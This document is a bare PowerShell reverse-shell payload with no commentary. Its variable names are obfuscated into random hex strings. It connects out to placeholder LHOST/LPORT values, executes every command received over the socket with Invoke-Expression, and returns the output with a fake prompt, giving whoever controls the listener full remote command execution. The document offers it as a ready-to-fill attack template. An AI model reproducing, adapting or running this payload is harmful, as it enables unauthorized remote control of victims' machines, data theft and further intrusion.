$b936d2c93ff34c7f92bf61e3cd68beea = New-Object System.Net.Sockets.TCPClient('LHOST',LPORT);$148c7bb549aa42e08352814e7765d1fa = $b936d2c93ff34c7f92bf61e3cd68beea.GetStream();[byte[]]$d5f00ff7ea634664880ae57785c2c14f = 0..65535|%{0};while(($1f6a5968649646599e178bcd07e98232 = $148c7bb549aa42e08352814e7765d1fa.Read($d5f00ff7ea634664880ae57785c2c14f, 0, $d5f00ff7ea634664880ae57785c2c14f.Length)) -ne 0){;$27123343ef8c4707827592616171ac18 = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($d5f00ff7ea634664880ae57785c2c14f,0, $1f6a5968649646599e178bcd07e98232);$269b9eec9ddf46c8add13ca405a9324d = (iex $27123343ef8c4707827592616171ac18 2>&1 | Out-String );$862c31a908554102aa1bb8129d9bced9 = $269b9eec9ddf46c8add13ca405a9324d + 'PS ' + "$($p = (Split-Path `"$(pwd)\\0x00\`");if ($p.trim() -eq ''){echo 'C:\'}else{echo $p})" + '> ';$18f0dee5222440db967f1264026aa671 = ([text.encoding]::ASCII).GetBytes($862c31a908554102aa1bb8129d9bced9);$148c7bb549aa42e08352814e7765d1fa.Write($18f0dee5222440db967f1264026aa671,0,$18f0dee5222440db967f1264026aa671.Length);$148c7bb549aa42e08352814e7765d1fa.Flush()};$b936d2c93ff34c7f92bf61e3cd68beea.Close()